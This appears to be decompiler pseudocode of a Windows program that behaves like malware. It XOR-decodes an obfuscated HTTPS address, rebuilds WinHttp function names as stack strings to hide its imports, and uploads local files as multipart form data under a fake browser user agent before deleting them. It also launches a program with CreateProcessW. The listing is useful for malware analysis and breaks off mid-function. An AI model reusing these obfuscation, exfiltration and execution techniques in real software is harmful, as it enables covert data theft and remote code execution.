struct <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b> { // PlaceHolder Structure
};

typedef struct __crt_seh_guarded_call<void> __crt_seh_guarded_call<void>, *P__crt_seh_guarded_call<void>;

struct __crt_seh_guarded_call<void> { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct <lambda_ae55bdf541ad94d75914d381c370e64d> <lambda_ae55bdf541ad94d75914d381c370e64d>, *P<lambda_ae55bdf541ad94d75914d381c370e64d>;

struct <lambda_ae55bdf541ad94d75914d381c370e64d> { // PlaceHolder Structure
};


// WARNING! conflicting data type names: /Demangler/wchar_t - /wchar_t

typedef struct <lambda_995298e7d72eb4c2aab26c0585b3abe5> <lambda_995298e7d72eb4c2aab26c0585b3abe5>, *P<lambda_995298e7d72eb4c2aab26c0585b3abe5>;

struct <lambda_995298e7d72eb4c2aab26c0585b3abe5> { // PlaceHolder Structure
};

typedef struct <lambda_b2ea41f6bbb362cd97d94c6828d90b61> <lambda_b2ea41f6bbb362cd97d94c6828d90b61>, *P<lambda_b2ea41f6bbb362cd97d94c6828d90b61>;

struct <lambda_b2ea41f6bbb362cd97d94c6828d90b61> { // PlaceHolder Structure
};

typedef struct <lambda_123407a5e2ac06da108355a851863b7a> <lambda_123407a5e2ac06da108355a851863b7a>, *P<lambda_123407a5e2ac06da108355a851863b7a>;

struct <lambda_123407a5e2ac06da108355a851863b7a> { // PlaceHolder Structure
};

typedef struct __crt_stdio_stream __crt_stdio_stream, *P__crt_stdio_stream;

struct __crt_stdio_stream { // PlaceHolder Structure
};

typedef struct _strflt _strflt, *P_strflt;

struct _strflt { // PlaceHolder Structure
};

typedef struct __crt_seh_guarded_call<int> __crt_seh_guarded_call<int>, *P__crt_seh_guarded_call<int>;

struct __crt_seh_guarded_call<int> { // PlaceHolder Structure
};

typedef enum module_id {
} module_id;

typedef struct dual_state_global<void_(__cdecl*)(int)> dual_state_global<void_(__cdecl*)(int)>, *Pdual_state_global<void_(__cdecl*)(int)>;

struct dual_state_global<void_(__cdecl*)(int)> { // PlaceHolder Structure
};

typedef struct stream_output_adapter<char> stream_output_adapter<char>, *Pstream_output_adapter<char>;

struct stream_output_adapter<char> { // PlaceHolder Structure
};

typedef struct string_output_adapter<char> string_output_adapter<char>, *Pstring_output_adapter<char>;

struct string_output_adapter<char> { // PlaceHolder Structure
};

typedef struct output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_> output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>, *Poutput_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>;

struct output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_> { // PlaceHolder Structure
};

typedef struct common_data<wchar_t> common_data<wchar_t>, *Pcommon_data<wchar_t>;

struct common_data<wchar_t> { // PlaceHolder Structure
};

typedef enum length_modifier {
} length_modifier;

typedef struct string_output_adapter<wchar_t> string_output_adapter<wchar_t>, *Pstring_output_adapter<wchar_t>;

struct string_output_adapter<wchar_t> { // PlaceHolder Structure
};

typedef struct formatting_buffer formatting_buffer, *Pformatting_buffer;

struct formatting_buffer { // PlaceHolder Structure
};

typedef struct common_data<char> common_data<char>, *Pcommon_data<char>;

struct common_data<char> { // PlaceHolder Structure
};

typedef struct output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_> output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>, *Poutput_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>;

struct output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_> { // PlaceHolder Structure
};

typedef struct output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_> output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>, *Poutput_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>;

struct output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_> { // PlaceHolder Structure
};

typedef enum function_id {
} function_id;

typedef struct scoped_fp_state_reset scoped_fp_state_reset, *Pscoped_fp_state_reset;

struct scoped_fp_state_reset { // PlaceHolder Structure
};

typedef struct write_result write_result, *Pwrite_result;

struct write_result { // PlaceHolder Structure
};

typedef struct c_string_character_source<wchar_t> c_string_character_source<wchar_t>, *Pc_string_character_source<wchar_t>;

struct c_string_character_source<wchar_t> { // PlaceHolder Structure
};

typedef struct c_string_character_source<char> c_string_character_source<char>, *Pc_string_character_source<char>;

struct c_string_character_source<char> { // PlaceHolder Structure
};

typedef struct big_integer big_integer, *Pbig_integer;

struct big_integer { // PlaceHolder Structure
};

typedef int (* _onexit_t)(void);

typedef struct lconv lconv, *Plconv;

struct lconv {
    char * decimal_point;
    char * thousands_sep;
    char * grouping;
    char * int_curr_symbol;
    char * currency_symbol;
    char * mon_decimal_point;
    char * mon_thousands_sep;
    char * mon_grouping;
    char * positive_sign;
    char * negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t * _W_decimal_point;
    wchar_t * _W_thousands_sep;
    wchar_t * _W_int_curr_symbol;
    wchar_t * _W_currency_symbol;
    wchar_t * _W_mon_decimal_point;
    wchar_t * _W_mon_thousands_sep;
    wchar_t * _W_positive_sign;
    wchar_t * _W_negative_sign;
};

typedef ushort wint_t;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct * pthreadlocinfo;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

struct localerefcount {
    char * locale;
    wchar_t * wlocale;
    int * refcount;
    int * wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int * lconv_intl_refcount;
    int * lconv_num_refcount;
    int * lconv_mon_refcount;
    struct lconv * lconv;
    int * ctype1_refcount;
    ushort * ctype1;
    ushort * pctype;
    uchar * pclmap;
    uchar * pcumap;
    struct __lc_time_data * lc_time_curr;
    wchar_t * locale_name[6];
};

struct __lc_time_data {
    char * wday_abbr[7];
    char * wday[7];
    char * month_abbr[12];
    char * month[12];
    char * ampm[2];
    char * ww_sdatefmt;
    char * ww_ldatefmt;
    char * ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t * _W_wday_abbr[7];
    wchar_t * _W_wday[7];
    wchar_t * _W_month_abbr[12];
    wchar_t * _W_month[12];
    wchar_t * _W_ampm[2];
    wchar_t * _W_ww_sdatefmt;
    wchar_t * _W_ww_ldatefmt;
    wchar_t * _W_ww_timefmt;
    wchar_t * _W_ww_locale_name;
};

typedef uint size_t;

typedef size_t rsize_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct * pthreadmbcinfo;

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t * mblocalename;
};

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct * _locale_t;

typedef ushort wctype_t;




undefined * FUN_00401000(void)

{
  return &DAT_0041ca88;
}



int __cdecl FUN_00401006(wchar_t *param_1,wchar_t *param_2)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  __crt_locale_pointers *p_Var4;
  char *pcVar5;
  
  pcVar5 = &stack0x0000000c;
  p_Var4 = (__crt_locale_pointers *)0x0;
  uVar3 = 0x7fffffff;
  puVar1 = (undefined4 *)FUN_00401000();
  iVar2 = ___stdio_common_vswprintf(*puVar1,puVar1[1],param_1,uVar3,param_2,p_Var4,pcVar5);
  if (iVar2 < 0) {
    iVar2 = -1;
  }
  return iVar2;
}



void __cdecl FUN_00401037(int param_1)

{
  FILE *pFVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined *puVar4;
  
  pFVar1 = (FILE *)___acrt_iob_func(1);
  puVar4 = &stack0x00000008;
  uVar3 = 0;
  puVar2 = (undefined4 *)FUN_00401000();
  FID_conflict____stdio_common_vfprintf(*puVar2,puVar2[1],pFVar1,param_1,uVar3,puVar4);
  return;
}



int __cdecl FUN_00401063(char *param_1,char *param_2)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  __crt_locale_pointers *p_Var4;
  char *pcVar5;
  
  pcVar5 = &stack0x0000000c;
  p_Var4 = (__crt_locale_pointers *)0x0;
  uVar3 = 0xffffffff;
  puVar1 = (uint *)FUN_00401000();
  iVar2 = ___stdio_common_vsprintf(*puVar1 | 1,puVar1[1],param_1,uVar3,param_2,p_Var4,pcVar5);
  if (iVar2 < 0) {
    iVar2 = -1;
  }
  return iVar2;
}



void FUN_00401096(void)

{
  DWORD DVar1;
  uint uVar2;
  HMODULE hModule;
  undefined extraout_DL;
  undefined uVar3;
  undefined4 local_1bc;
  undefined4 uStack440;
  undefined4 uStack436;
  undefined4 uStack432;
  undefined4 local_1ac;
  undefined4 uStack424;
  undefined4 uStack420;
  undefined4 uStack416;
  undefined4 local_19c;
  undefined4 uStack408;
  undefined4 uStack404;
  undefined4 uStack400;
  undefined local_18c;
  undefined4 local_188;
  undefined4 uStack388;
  undefined4 uStack384;
  undefined4 uStack380;
  undefined local_178;
  undefined4 local_174;
  undefined4 uStack368;
  undefined4 uStack364;
  undefined4 uStack360;
  undefined local_164;
  undefined local_163;
  undefined local_162;
  undefined4 local_160;
  undefined4 uStack348;
  undefined4 uStack344;
  undefined4 uStack340;
  undefined local_150;
  undefined local_14f;
  undefined local_14e;
  undefined4 local_14c;
  undefined4 uStack328;
  undefined4 uStack324;
  undefined4 uStack320;
  undefined2 local_13c;
  undefined local_13a;
  undefined4 local_138;
  undefined4 uStack308;
  undefined4 uStack304;
  undefined4 uStack300;
  undefined4 local_128;
  undefined4 local_124;
  undefined4 uStack288;
  undefined4 uStack284;
  undefined4 uStack280;
  undefined local_114;
  undefined local_113;
  undefined local_112;
  undefined local_111;
  undefined2 local_110;
  undefined local_10e;
  wchar_t local_10c;
  undefined2 local_10a;
  undefined2 local_108;
  undefined2 local_106;
  undefined2 local_104;
  undefined2 local_102;
  undefined2 local_100;
  undefined2 local_fe;
  undefined2 local_fc;
  undefined2 local_fa;
  undefined2 local_f8;
  undefined2 local_f6;
  undefined2 local_f4;
  undefined2 local_f2;
  undefined2 local_f0;
  undefined2 local_ee;
  ushort local_ec [39];
  undefined2 local_9e;
  ushort local_9c [38];
  undefined2 local_50;
  undefined2 local_4c;
  undefined2 local_4a;
  undefined2 local_48;
  undefined2 local_46;
  undefined2 local_44;
  undefined2 local_42;
  undefined2 local_40;
  undefined2 local_3e;
  undefined2 local_3c;
  undefined2 local_3a;
  undefined2 local_38;
  WCHAR local_34;
  undefined2 local_32;
  undefined2 local_30;
  undefined2 local_2e;
  undefined2 local_2c;
  undefined2 local_2a;
  undefined2 local_28;
  undefined2 local_26;
  WCHAR local_24;
  undefined2 local_22;
  undefined2 local_20;
  undefined2 local_1e;
  undefined2 local_1c;
  CHAR local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar3 = 0;
  DVar1 = GetTempPathW(0x104,&DAT_0041c880);
  if (DVar1 != 0) {
    local_10c = L'6';
    local_108 = 0x44;
    local_100 = 0x45;
    local_106 = 0x43;
    local_fc = 0x33;
    local_f0 = 0x42;
    local_ee = 0;
    local_10a = 0x41;
    local_104 = 0x2d;
    local_4a = 0x31;
    local_f2 = 0x35;
    local_102 = local_10a;
    local_fe = local_100;
    local_fa = local_106;
    local_f8 = local_104;
    local_f6 = local_4a;
    local_f4 = local_10a;
    _wcscat_s(&DAT_0041c880,0x104,&local_10c);
    local_24 = L'C';
    local_22 = 0x3a;
    local_20 = 0x5c;
    local_1c = 0;
    local_1e = local_20;
    GetVolumeInformationW
              (&local_24,(LPWSTR)0x0,0,(LPDWORD)&stack0xfffffe40,(LPDWORD)0x0,(LPDWORD)0x0,
               (LPWSTR)0x0,0);
    local_46 = 0x5f;
    local_44 = 0x6b;
    local_4c = 0x76;
    local_48 = 0x33;
    local_42 = 0x74;
    local_3c = 0x70;
    local_3a = 0x30;
    local_38 = 0;
    local_40 = local_48;
    local_3e = local_48;
    FUN_00401006((wchar_t *)&DAT_0041c240,(wchar_t *)L"%ls_%u");
    local_9c[0] = 0x33;
    local_9c[13] = 0x76;
    local_9c[20] = 0x76;
    local_9c[1] = 0x2f;
    local_9c[2] = 0x2f;
    local_9c[5] = 0x61;
    local_9c[8] = 0x2e;
    local_9c[10] = 0x3f;
    local_9c[11] = 0x68;
    local_9c[12] = 0x69;
    local_9c[3] = 0x2b;
    local_9c[9] = 0x2b;
    local_9c[16] = 0x38;
    local_9c[17] = 0x2e;
    local_9c[15] = 0x3e;
    local_9c[19] = 0x3e;
    local_9c[22] = 0x3e;
    local_9c[24] = 0x2d;
    local_9c[4] = 0x28;
    local_9c[14] = 0x28;
    local_9c[21] = 0x28;
    local_9c[25] = 0x6f;
    local_9c[6] = 0x74;
    local_9c[7] = 0x74;
    local_9c[18] = 0x29;
    local_9c[23] = 0x29;
    local_9c[26] = 0x75;
    local_9c[27] = 0x38;
    local_9c[28] = 0x34;
    local_9c[29] = 0x36;
    local_9c[31] = 0x32;
    local_9c[33] = 0x32;
    local_9c[35] = 0x2b;
    local_9c[37] = 0x2b;
    uVar2 = 0;
    local_9c[32] = 0x35;
    local_9c[30] = 0x74;
    local_9c[34] = 0x75;
    local_9c[36] = 0x33;
    local_50 = 0;
    do {
      local_9c[uVar2] = local_9c[uVar2] ^ 0x5b;
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x26);
    FUN_00401006((wchar_t *)&DAT_0041c470,(wchar_t *)&DAT_00419718);
    local_ec[1] = 0x39;
    local_ec[2] = 0x39;
    local_ec[5] = 0x77;
    local_ec[8] = 0x38;
    local_ec[10] = 0x29;
    local_ec[11] = 0x7e;
    local_ec[12] = 0x7f;
    local_ec[0] = 0x25;
    local_ec[16] = 0x2e;
    local_ec[13] = 0x60;
    local_ec[20] = 0x60;
    local_ec[17] = 0x38;
    local_ec[22] = 0x28;
    local_ec[24] = 0x3b;
    local_ec[25] = 0x79;
    local_ec[26] = 99;
    local_ec[4] = 0x3e;
    local_ec[14] = 0x3e;
    local_ec[21] = 0x3e;
    local_ec[27] = 0x2e;
    local_ec[3] = 0x3d;
    local_ec[6] = 0x62;
    local_ec[7] = 0x62;
    local_ec[9] = 0x3d;
    local_ec[15] = 0x28;
    local_ec[18] = 0x3f;
    local_ec[19] = 0x28;
    local_ec[23] = 0x3f;
    local_ec[28] = 0x22;
    local_ec[29] = 0x20;
    local_ec[30] = 0x62;
    local_ec[31] = 0x24;
    local_ec[32] = 0x23;
    local_ec[33] = 0x2b;
    local_ec[35] = 99;
    uVar2 = 0;
    local_ec[34] = 0x22;
    local_ec[36] = 0x3d;
    local_ec[37] = 0x25;
    local_ec[38] = 0x3d;
    local_9e = 0;
    do {
      local_ec[uVar2] = local_ec[uVar2] ^ 0x4d;
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x27);
    FUN_00401006((wchar_t *)&DAT_0041c678,(wchar_t *)&DAT_00419718);
    local_1ac = 0x486e6957;
    uStack424 = 0x52707474;
    uStack420 = 0x44646165;
    uStack416 = 0x617461;
    local_18 = 'W';
    local_34 = L'w';
    local_32 = 0x69;
    local_1bc = 0x486e6957;
    uStack440 = 0x43707474;
    uStack436 = 0x6b636172;
    uStack432 = 0x6c7255;
    local_2e = 0x68;
    local_188 = 0x486e6957;
    uStack388 = 0x53707474;
    uStack384 = 0x704f7465;
    uStack380 = 0x6e6f6974;
    local_28 = 0x70;
    local_19c = 0x486e6957;
    uStack408 = 0x57707474;
    uStack404 = 0x65746972;
    uStack400 = 0x61746144;
    local_26 = 0;
    local_14c = 0x486e6957;
    uStack328 = 0x43707474;
    uStack324 = 0x65736f6c;
    uStack320 = 0x646e6148;
    local_17 = 0x69;
    local_160 = 0x486e6957;
    uStack348 = 0x4f707474;
    uStack344 = 0x526e6570;
    uStack340 = 0x65757165;
    local_12 = 0x70;
    local_174 = 0x486e6957;
    uStack368 = 0x51707474;
    uStack364 = 0x79726575;
    uStack360 = 0x6974704f;
    local_11 = 0x43;
    local_138 = 0x486e6957;
    uStack308 = 0x51707474;
    uStack304 = 0x79726575;
    uStack300 = 0x64616548;
    local_30 = 0x6e;
    local_2c = 0x74;
    local_163 = 0x6e;
    local_15 = 0x48;
    local_14f = 0x74;
    local_10 = 0x6f;
    local_d = 0x65;
    local_c = 99;
    local_a = 0;
    local_178 = 0;
    local_18c = 0;
    local_13c = 0x656c;
    local_13a = 0;
    local_150 = 0x73;
    local_14e = 0;
    local_164 = 0x6f;
    local_162 = 0;
    local_128 = 0x737265;
    local_124 = 0x486e6957;
    uStack288 = 0x52707474;
    uStack284 = 0x69656365;
    uStack280 = 0x65526576;
    local_114 = 0x73;
    local_113 = 0x70;
    local_112 = 0x6f;
    local_110 = 0x6573;
    local_10e = 0;
    local_111 = local_163;
    local_2a = local_2c;
    local_16 = local_163;
    local_14 = local_14f;
    local_13 = local_14f;
    local_f = local_163;
    local_e = local_163;
    local_b = local_14f;
    hModule = LoadLibraryW(&local_34);
    if (hModule != (HMODULE)0x0) {
      DAT_0041c448 = GetProcAddress(hModule,&local_18);
      DAT_0041c44c = GetProcAddress(hModule,(LPCSTR)&local_1ac);
      DAT_0041c450 = GetProcAddress(hModule,(LPCSTR)&local_1bc);
      DAT_0041c454 = GetProcAddress(hModule,(LPCSTR)&local_188);
      DAT_0041c458 = GetProcAddress(hModule,(LPCSTR)&local_19c);
      DAT_0041c45c = GetProcAddress(hModule,(LPCSTR)&local_14c);
      DAT_0041c460 = GetProcAddress(hModule,(LPCSTR)&local_160);
      DAT_0041c464 = GetProcAddress(hModule,(LPCSTR)&local_174);
      DAT_0041c468 = GetProcAddress(hModule,(LPCSTR)&local_138);
      FUN_00401037((int)&DAT_00419720);
      DAT_0041c46c = GetProcAddress(hModule,(LPCSTR)&local_124);
      if ((((((DAT_0041c448 != (FARPROC)0x0) && (DAT_0041c44c != (FARPROC)0x0)) &&
            (DAT_0041c450 != (FARPROC)0x0)) &&
           ((DAT_0041c454 != (FARPROC)0x0 && (DAT_0041c458 != (FARPROC)0x0)))) &&
          ((DAT_0041c45c != (FARPROC)0x0 &&
           ((DAT_0041c460 != (FARPROC)0x0 && (DAT_0041c464 != (FARPROC)0x0)))))) &&
         ((DAT_0041c468 != (FARPROC)0x0 && (DAT_0041c46c != (FARPROC)0x0)))) {
        FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,extraout_DL,uVar3);
        return;
      }
    }
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void __fastcall FUN_00401774(LPCWSTR param_1)

{
  undefined *puVar1;
  _STARTUPINFOW *p_Var2;
  undefined extraout_DL;
  int iVar3;
  undefined uVar4;
  HANDLE in_stack_ffffff9c;
  HANDLE local_60;
  _STARTUPINFOW local_54;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  puVar1 = &stack0xffffff9c;
  iVar3 = 0x10;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  iVar3 = 0x44;
  p_Var2 = &local_54;
  do {
    *(undefined *)&p_Var2->cb = 0;
    p_Var2 = (_STARTUPINFOW *)((int)&p_Var2->cb + 1);
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  local_54.cb = 0x44;
  CreateProcessW(param_1,(LPWSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0,
                 (LPVOID)0x0,&DAT_0041c880,&local_54,(LPPROCESS_INFORMATION)&stack0xffffff9c);
  CloseHandle(in_stack_ffffff9c);
  uVar4 = SUB41(in_stack_ffffff9c,0);
  CloseHandle(local_60);
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,extraout_DL,uVar4);
  return;
}



// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_004017e5(short **param_1,undefined4 *param_2)

{
  char cVar1;
  short *psVar2;
  short *psVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  char *_Dst;
  HANDLE pvVar7;
  short *psVar8;
  short *_Dst_00;
  LPDWORD lpFileSizeHigh;
  short *_SizeInBytes;
  short *_Dst_01;
  wchar_t *pwVar9;
  undefined *puVar10;
  char *pcVar11;
  char *pcVar12;
  undefined *extraout_EDX;
  uint uVar13;
  undefined8 uVar14;
  DWORD DVar15;
  SIZE_T dwBytes;
  undefined in_stack_ffffffa8;
  wchar_t *local_28;
  int local_24;
  undefined *local_20;
  int local_1c;
  undefined4 local_18;
  int local_14;
  DWORD local_10;
  char *local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar14 = FUN_00401c6a(*param_1,&local_28);
  puVar10 = (undefined *)((ulonglong)uVar14 >> 0x20);
  if ((int)uVar14 == 0) goto LAB_00401b95;
  if (local_18._2_1_ == '\x01') {
    uVar13 = (uint)param_1[2] | 0x40;
  }
  else {
    uVar13 = (uint)param_1[2] & 0xffffffbf;
  }
  if (*(ushort *)(param_1 + 1) != 0) {
    local_18._0_2_ = *(ushort *)(param_1 + 1);
  }
  local_18 = local_18 & 0xffff0000 | (uint)(ushort)local_18;
  iVar4 = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; Win64; rv:46.0)",1,0,0,0);
  if (iVar4 != 0) {
    iVar5 = (*DAT_0041c448)(iVar4,local_28,local_18,0);
    if (iVar5 != 0) {
      if (param_1[5] == (short *)0x0) {
LAB_00401abc:
        iVar4 = FUN_00401e61(iVar5,local_20,(int)param_1,uVar13);
        if (iVar4 != 0) {
          if ((param_1[5] != (short *)0x0) ||
             (FUN_00401ba7(iVar4,param_2,(uint)param_1[8]), param_1[5] != (short *)0x0)) {
            SetFileAttributesW(param_1[5],0x80);
            DeleteFileW(param_1[5]);
          }
          (*DAT_0041c45c)(iVar4);
        }
      }
      else {
        local_10 = 0;
        GetTickCount();
        pcVar6 = (char *)FUN_00406f66(0x400);
        _Dst = (char *)FUN_00406f66(0x400);
        dwBytes = 0x400;
        DVar15 = 8;
        pvVar7 = GetProcessHeap();
        psVar8 = (short *)HeapAlloc(pvVar7,DVar15,dwBytes);
        _Dst_00 = (short *)FUN_00406f66(0x100);
        if ((((pcVar6 != (char *)0x0) && (_Dst != (char *)0x0)) && (psVar8 != (short *)0x0)) &&
           (_Dst_00 != (short *)0x0)) {
          _memset(pcVar6,0,0x400);
          _memset(_Dst,0,0x400);
          _memset(_Dst_00,0,0x100);
          pvVar7 = (HANDLE)0x3;
          lpFileSizeHigh =
               (LPDWORD)CreateFileW(param_1[5],0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                                    (HANDLE)0x0);
          if (lpFileSizeHigh != (LPDWORD)0xffffffff) {
            DVar15 = GetFileSize(pvVar7,lpFileSizeHigh);
            FUN_00401063(pcVar6,
                         "------Boundary%08X\r\nContent-Disposition: form-data; name=\"file\"; ");
            PathFindFileNameW(param_1[5]);
            FUN_00401063(pcVar6,
                         "%sfilename=\"%ls\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            FUN_00401063(_Dst,"\r\n------Boundary%08X--\r\n");
            FUN_00401006((wchar_t *)psVar8,
                         (wchar_t *)L"Content-Type: multipart/form-data; boundary=----Boundary%08X")
            ;
            pcVar12 = pcVar6;
            do {
              cVar1 = *pcVar12;
              pcVar12 = pcVar12 + 1;
            } while (cVar1 != '\0');
            local_c = _Dst + 1;
            pcVar11 = _Dst;
            do {
              cVar1 = *pcVar11;
              pcVar11 = pcVar11 + 1;
            } while (cVar1 != '\0');
            _SizeInBytes = (short *)(pcVar12 +
                                    (int)(pcVar11 + DVar15 + (-(int)local_c - (int)(pcVar6 + 1))));
            _Dst_01 = (short *)FUN_00406f66((size_t)_SizeInBytes);
            psVar2 = _SizeInBytes;
            psVar3 = _Dst_01;
            if (_Dst_01 != (short *)0x0) {
              for (; psVar2 != (short *)0x0; psVar2 = (short *)((int)psVar2 + -1)) {
                *(char *)psVar3 = '\0';
                psVar3 = (short *)((int)psVar3 + 1);
              }
              _strcat_s((char *)_Dst_01,(rsize_t)_SizeInBytes,pcVar6);
              pcVar12 = pcVar6;
              do {
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
              } while (cVar1 != '\0');
              ReadFile(lpFileSizeHigh,(char *)((int)_Dst_01 + ((int)pcVar12 - (int)(pcVar6 + 1))),
                       DVar15,&local_10,(LPOVERLAPPED)0x0);
              CloseHandle(lpFileSizeHigh);
              pcVar12 = _Dst;
              do {
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
              } while (cVar1 != '\0');
              pcVar11 = pcVar6;
              do {
                cVar1 = *pcVar11;
                pcVar11 = pcVar11 + 1;
              } while (cVar1 != '\0');
              FID_conflict__memcpy
                        ((char *)((int)_Dst_01 + (int)(pcVar11 + (DVar15 - (int)(pcVar6 + 1)))),_Dst
                         ,(int)pcVar12 - (int)(_Dst + 1));
              FUN_00401006((wchar_t *)_Dst_00,(wchar_t *)L"Content-Length: %lu");
              param_1[6] = psVar8;
              iVar4 = 0x400;
              param_1[7] = _Dst_00;
              param_1[3] = _Dst_01;
              param_1[4] = _SizeInBytes;
              pcVar12 = pcVar6;
              do {
                *pcVar12 = '\0';
                pcVar12 = pcVar12 + 1;
                iVar4 = iVar4 + -1;
              } while (iVar4 != 0);
              FID_conflict__free(pcVar6);
              iVar4 = 0x400;
              pcVar6 = _Dst;
              do {
                *pcVar6 = '\0';
                pcVar6 = pcVar6 + 1;
                iVar4 = iVar4 + -1;
              } while (iVar4 != 0);
              FID_conflict__free(_Dst);
              goto LAB_00401abc;
            }
          }
        }
      }
      local_14 = 0;
      local_c = &DAT_00000004;
      iVar4 = (*DAT_0041c464)(iVar5,0x15,&local_14,&local_c);
      (*DAT_0041c45c)(iVar5);
      if (((iVar4 == 0) || (local_14 == 0)) || (iVar4 = local_14, local_c != &DAT_00000004))
      goto LAB_00401b4d;
    }
    (*DAT_0041c45c)(iVar4);
  }
LAB_00401b4d:
  if (local_28 != (wchar_t *)0x0) {
    pwVar9 = local_28;
    for (local_24 = local_24 * 2; local_24 != 0; local_24 = local_24 + -1) {
      *pwVar9 = (wchar_t)0x0;
      pwVar9 = pwVar9 + 1;
    }
    FID_conflict__free(local_28);
  }
  in_stack_ffffffa8 = SUB41(local_28,0);
  puVar10 = local_20;
  if (local_20 != (undefined *)0x0) {
    for (local_1c = local_1c * 2; local_1c != 0; local_1c = local_1c + -1) {
      *puVar10 = 0;
      puVar10 = puVar10 + 1;
    }
    FID_conflict__free(local_20);
    puVar10 = extraout_EDX;
  }
LAB_00401b95:
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,(char)puVar10,in_stack_ffffffa8);
  return;
}



void __fastcall FUN_00401ba7(undefined4 param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  undefined4 *extraout_EDX;
  undefined4 *puVar2;
  undefined *puVar3;
  undefined *puVar4;
  uint uVar5;
  undefined8 uVar6;
  undefined in_stack_fffffff4;
  int iVar7;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar5 = 0;
  puVar2 = param_2;
  if (param_2 != (undefined4 *)0x0) {
    puVar4 = (undefined *)0x0;
    if ((param_3 == 0) || (0x1900000 < param_3)) {
      param_3 = 0x1900000;
    }
    do {
      iVar7 = 0x1000;
      if (uVar5 + 0x1000 == 0) {
        FID_conflict__free(puVar4);
        puVar3 = (undefined *)0x0;
      }
      else {
        uVar6 = FUN_0040446e(puVar4,uVar5 + 0x1000);
        puVar2 = (undefined4 *)((ulonglong)uVar6 >> 0x20);
        puVar3 = (undefined *)uVar6;
        if (puVar3 == (undefined *)0x0) break;
      }
